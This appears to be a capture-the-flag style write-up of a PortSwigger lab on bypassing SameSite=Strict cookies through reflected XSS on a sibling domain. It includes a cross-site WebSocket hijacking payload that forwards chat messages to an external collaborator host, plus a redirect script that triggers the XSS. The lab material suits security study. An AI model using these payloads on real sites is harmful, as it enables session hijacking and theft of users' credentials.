### üß™ Lab Summary: SameSite Strict Bypass via Sibling Domain

- The target site sets session cookies with `SameSite=Strict`, which blocks them from being sent in cross-site requests.
- However, a **sibling domain** (e.g., `cms-YOUR-LAB-ID.web-security-academy.net`) is considered **same-site** by the browser.
- This sibling domain has a **reflected XSS vulnerability** in its login form.
- The attacker uses this XSS to inject a **CSWSH payload** that hijacks the victim‚Äôs WebSocket session.

üîó [View full lab details on PortSwigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

---

### üî• Exploit Strategy

1. **Discover the sibling domain** via `Access-Control-Allow-Origin` headers.
2. **Find reflected XSS** in the login form of the sibling domain.
3. **Inject a CSWSH payload** into the `username` parameter:
   ```html
   <script>
     var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
     ws.onopen = function () { ws.send("READY"); };
     ws.onmessage = function (event) {
       fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {
         method: 'POST',
         mode: 'no-cors',
         body: event.data
       });
     };
   </script>
   ```
4. **Trigger the XSS via a GET request**:
   ```html
   <script>
     document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=URL_ENCODED_PAYLOAD&password=anything";
   </script>
   ```
5. Since the request originates from a **same-site sibling domain**, the browser sends the `SameSite=Strict` session cookie.
6. The WebSocket connection is established, and the victim‚Äôs chat history (including credentials) is exfiltrated.

---

### üß† Symbolic Mapping

| Domain | Cookie Sent? | Vulnerability Used | Symbolic Shard |
|--------|--------------|--------------------|----------------|
| Cross-site | ‚ùå Blocked | CSWSH fails | Sealed gate |
| Sibling domain | ‚úÖ Allowed | Reflected XSS | Hidden passage |
| WebSocket hijack | ‚úÖ Hijacked | Chat history leaked | Breached mirror |
